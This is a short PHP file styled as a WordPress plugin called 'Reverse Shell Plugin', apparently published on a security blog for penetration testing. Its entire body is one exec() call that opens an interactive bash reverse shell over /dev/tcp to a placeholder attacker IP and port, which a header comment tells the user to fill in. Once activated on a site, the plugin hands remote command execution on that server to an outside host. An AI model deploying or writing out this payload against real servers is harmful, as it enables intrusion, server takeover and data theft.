<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Vince Matteo
* Author URI: http://www.sevenlayers.com
* Plugin page: https://www.sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell
*
* CHANGE THE STRINGS "$AttackerIp" AND "$AttackerPort" /!\ /!\ /!\
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/$AttackerIp/$AttackerPort 0>&1'");
?>

